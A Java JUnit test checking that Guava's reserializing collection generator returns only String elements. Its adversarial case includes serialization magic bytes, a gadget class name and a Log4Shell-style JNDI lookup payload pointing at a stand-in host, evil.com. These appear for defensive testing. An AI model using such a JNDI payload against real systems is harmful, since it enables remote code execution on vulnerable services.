import com.google.common.collect.testing.ReserializingTestCollectionGenerator;
import com.google.common.collect.testing.TestCollectionGenerator;
import com.google.common.collect.testing.SampleElements;
import org.junit.Test;

import java.io.*;
import java.util.*;

import static org.junit.Assert.*;

public class ReserializingTestCollectionGeneratorSecurityTest {

    /**
     * Security invariant: Reserialization must only produce objects of the expected type
     * and must not allow arbitrary code execution through crafted serialized streams.
     * The reserialized collection must be structurally equivalent to the original.
     */
    @Test
    public void testReserializationPreservesTypeAndContent() {
        TestCollectionGenerator<String> baseGenerator = new TestCollectionGenerator<String>() {
            @Override
            public SampleElements<String> samples() {
                return new SampleElements<>("a", "b", "c", "d", "e");
            }
            @Override
            public Collection<String> create(Object... elements) {
                ArrayList<String> list = new ArrayList<>();
                for (Object e : elements) list.add((String) e);
                return list;
            }
            @Override
            public String[] createArray(int length) { return new String[length]; }
            @Override
            public Iterable<String> order(List<String> insertionOrder) { return insertionOrder; }
        };

        ReserializingTestCollectionGenerator<String> generator =
                ReserializingTestCollectionGenerator.newInstance(baseGenerator);

        // Valid input - normal strings
        Collection<String> result = generator.create("hello", "world");
        assertNotNull(result);
        assertTrue(result instanceof Collection);
        assertEquals(2, result.size());
        assertTrue(result.contains("hello"));
        assertTrue(result.contains("world"));

        // Boundary: empty collection
        Collection<String> empty = generator.create();
        assertNotNull(empty);
        assertEquals(0, empty.size());

        // Adversarial: strings that look like serialized object markers
        Collection<String> adversarial = generator.create(
                "\u00ac\u00ed\u0000\u0005", // Java serialization magic bytes as string
                "javax.script.ScriptEngineManager",
                "${jndi:ldap://evil.com/exploit}");
        assertNotNull(adversarial);
        assertEquals(3, adversarial.size());
        // Invariant: output must only contain String instances
        for (Object item : adversarial) {
            assertTrue("Deserialized item must be a String", item instanceof String);
        }
    }
}